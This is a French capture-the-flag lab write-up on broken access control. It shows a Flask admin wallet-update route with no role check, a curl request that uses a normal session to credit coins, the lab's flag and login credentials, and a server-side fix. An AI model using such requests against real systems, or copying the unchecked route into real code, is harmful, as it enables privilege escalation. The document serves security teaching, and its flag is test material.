Jour 1 / Lab 1

Contrôle d’accès défaillant sur un endpoint admin

Le store réserve le bouton « Acheter le flag » à l’utilisateur d’id 2, qui ne possède que 10 pièces au départ. Le profil admin affiche un formulaire de mise à jour du portefeuille, mais l’endpoint derrière ne vérifie jamais qui appelle. N’importe quel utilisateur connecté peut remplir n’importe quel portefeuille.

Rappel rapide — Contrôle d’accès défaillant

Un contrôle d’accès défaillant apparaît quand le serveur fait confiance au client pour décider qui a le droit de faire quoi. Cacher un bouton dans l’interface n’est pas une autorisation : le handler de la route doit vérifier le rôle de l’appelant lui-même.

Dans ce lab l’impact est une élévation de privilèges par altération d’état : un utilisateur normal atteint une fonction admin pour se créditer les pièces nécessaires à l’achat du flag.

D’où vient la vulnérabilité

La route de mise à jour du portefeuille accepte n’importe quelle session authentifiée et écrit le nouveau solde directement. Aucun contrôle de rôle.

@app.route("/admin/update_wallet", methods=["POST"])
def update_wallet():
    data = request.get_json(silent=True) or {}
    uid = int(data.get("id", 0) or request.form.get("id", 0))
    new_sold = int(data.get("sold", 0) or request.form.get("sold", 0))
    if uid in users:
        users[uid]["coins"] = new_sold
        return ...

Le formulaire qui appelle cet endpoint n’est rendu que dans le profil admin. C’est un confort visuel, pas un contrôle de sécurité. La route reste accessible à toute personne qui connaît le chemin.

Exploitation

Connecte-toi en tant qu’utilisateur normal, puis envoie directement la requête du formulaire admin. Utilise les mêmes noms de champ que le formulaire d’admin (id et sold).

Connexion

username=user
password=user123

Appel de l’endpoint « admin » avec une session normale

curl -i http://localhost:5009/admin/update_wallet \
  -b cookies.txt \
  --data "id=2&sold=999"

Le serveur accepte la requête, écrit 999 pièces sur l’id 2 et redirige vers le profil. Va dans le store, clique sur Buy — le flag est à toi.

Flag

CONGR4TS_H333333333CKER

Le correctif

L’autorisation se fait côté serveur. On définit ce qu’est un admin et on rejette la requête avant tout traitement.

def is_admin(u):
    return u and u["id"] == 1

@app.route("/admin/update_wallet", methods=["POST"])
def update_wallet():
    cu = current_user()
    if not is_admin(cu):
        return "forbidden", 403
    # ... suite du handler

Deux règles à garder en tête :

  • Cacher un contrôle dans l’interface n’est pas un contrôle d’accès.
  • Chaque endpoint privilégié doit vérifier l’identité et le rôle de l’appelant lui-même, à chaque requête.
